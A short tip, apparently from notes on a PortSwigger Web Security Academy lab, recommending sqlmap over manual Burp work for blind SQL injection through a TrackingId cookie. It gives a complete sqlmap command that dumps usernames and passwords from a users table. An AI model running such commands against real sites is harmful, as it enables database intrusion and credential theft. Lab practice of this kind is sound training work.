Doing Blind SQL for cookie manualy with Burp is pain just use **SQLMAP** like that:

```
sqlmap -u "https://0adb0098037cf1028398aac600ae00ce.web-security-academy.net/" --cookie="TrackingId=QghvfD6Z4VBvGQEL" -p TrackingId --technique=BT  --level=5 --risk=3 -D public -T users -C "password,username" --dump
```
